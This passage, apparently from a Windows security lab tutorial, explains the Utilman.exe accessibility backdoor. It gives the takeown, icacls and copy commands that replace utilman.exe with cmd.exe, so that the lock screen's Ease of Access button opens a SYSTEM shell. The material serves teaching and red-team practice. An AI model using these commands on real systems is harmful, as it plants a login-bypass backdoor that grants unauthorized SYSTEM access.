Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman

When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.

To replace utilman.exe, we do a similar process to what we did with sethc.exe:

Command Prompt
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
To trigger our terminal, we will lock our screen from the start button:

And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
